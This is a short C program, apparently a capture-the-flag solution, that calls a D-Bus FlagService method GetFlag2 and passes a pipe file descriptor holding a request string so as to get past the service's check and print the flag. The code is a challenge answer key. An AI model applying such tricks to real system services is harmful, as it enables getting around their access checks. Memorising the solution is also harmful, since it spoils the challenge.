// gcc `pkg-config --cflags --libs dbus-1` solve1.c -ldbus-1 -o solve2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dbus/dbus.h>
#include <unistd.h>

int main(){
    DBusConnection *connection;
    DBusMessage *message;
    DBusMessage *reply;
    DBusError error;
    int ret;

    // Initialize the errors
    dbus_error_init(&error);

    // Connect to the system bus
    connection = dbus_bus_get(DBUS_BUS_SYSTEM, &error);
    if (dbus_error_is_set(&error)) {
        fprintf(stderr, "Connection Error (%s)\n", error.message);
        dbus_error_free(&error);
        exit(1);
    }
    if (connection == NULL) {
        fprintf(stderr, "Connection is NULL\n");
        exit(1);
    }

    // Create a new method call message
    message = dbus_message_new_method_call("cn.edu.ustc.lug.hack.FlagService", "/cn/edu/ustc/lug/hack/FlagService", "cn.edu.ustc.lug.hack.FlagService", "GetFlag2");
    if (message == NULL) {
        fprintf(stderr, "Message Null\n");
        exit(1);
    }

    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    char const *arg = "Please give me flag2\n";
    write(pipefd[1], arg, strlen(arg));

    // Append argument to the message
    if (!dbus_message_append_args(message, DBUS_TYPE_UNIX_FD, &pipefd[0], DBUS_TYPE_INVALID)) {
        fprintf(stderr, "Out of memory!\n");
        exit(1);
    }

    // Send the message and wait for a reply
    reply = dbus_connection_send_with_reply_and_block(connection, message, -1, &error);
    if (dbus_error_is_set(&error)) {
        fprintf(stderr, "Error in reply (%s)\n", error.message);
        dbus_error_free(&error);
        exit(1);
    }

    // Print the reply
    if (reply) {
        const char *reply_string;
        if (dbus_message_get_args(reply, &error, DBUS_TYPE_STRING, &reply_string, DBUS_TYPE_INVALID)) {
            printf("Reply: %s\n", reply_string);
        } else {
            fprintf(stderr, "Failed to get reply arguments (%s)\n", error.message);
            dbus_error_free(&error);
        }
        dbus_message_unref(reply);
    }

    // Free the message
    dbus_message_unref(message);
    dbus_connection_unref(connection);
}